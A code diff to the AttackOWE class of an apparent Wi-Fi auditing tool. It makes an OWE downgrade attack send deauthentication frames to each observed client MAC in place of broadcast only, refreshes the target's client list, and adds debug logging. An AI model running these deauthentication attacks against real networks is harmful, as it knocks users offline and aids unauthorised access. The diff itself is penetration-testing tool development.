@@ -45,7 +45,8 @@ class AttackOWE(Attack):
             try:
                 from ..ui.attack_view import OWEAttackView
                 self.view = OWEAttackView(OutputManager.get_controller(), target)
-            except Exception:
+            except Exception as e:
+                log_debug('AttackOWE', f'Suppressed non-fatal error: {e}')
                 self.view = None
 
     def run(self):
@@ -149,7 +150,7 @@ class AttackOWE(Attack):
                           output_file_prefix='owe_downgrade') as airodump:
 
                 try:
-                    self.wait_for_target(airodump)
+                    airodump_target = self.wait_for_target(airodump)
                 except Exception as e:
                     Color.pl('{!} {R}Target not found: %s{W}' % str(e))
                     return False
@@ -162,10 +163,31 @@ class AttackOWE(Attack):
                 while not downgrade_timeout.ended() and deauth_count < max_deauths:
                     if deauth_timer.ended():
                         try:
-                            Aireplay.deauth(
-                                self.target.bssid,
-                                num_deauths=Configuration.num_deauths
-                            )
+                            refreshed = self.wait_for_target(airodump, timeout=1)
+                            if refreshed:
+                                airodump_target = refreshed
+                        except Exception as e:
+                            log_debug('AttackOWE', 'Target refresh failed: %s' % e)
+
+                        clients = [
+                            client.station
+                            for client in getattr(airodump_target, 'clients', [])
+                            if getattr(client, 'station', None)
+                        ]
+                        try:
+                            if clients:
+                                for client_mac in clients:
+                                    Aireplay.deauth(
+                                        self.target.bssid,
+                                        client_mac=client_mac,
+                                        num_deauths=Configuration.num_deauths
+                                    )
+                            else:
+                                # No client details yet; fall back to broadcast.
+                                Aireplay.deauth(
+                                    self.target.bssid,
+                                    num_deauths=Configuration.num_deauths
+                                )
                             deauth_count += 1
                             if self.view:
                                 self.view.add_log(
@@ -241,12 +263,14 @@ class AttackOWE(Attack):
                         log_debug('AttackOWE', 'Client tracking error: %s' % e)
 
                     # Deauth to trigger re-association
-                    if deauth_timer.ended() and len(clients_seen) > 0:
+                    if deauth_timer.ended() and clients_seen:
                         try:
-                            Aireplay.deauth(
-                                self.target.bssid,
-                                num_deauths=Configuration.num_deauths
-                            )
+                            for client_mac in clients_seen:
+                                Aireplay.deauth(
+                                    self.target.bssid,
+                                    client_mac=client_mac,
+                                    num_deauths=Configuration.num_deauths
+                                )
                         except Exception as e:
                             log_debug('AttackOWE', 'Deauth error: %s' % e)
                         deauth_timer = Timer(Configuration.wpa_deauth_timeout)
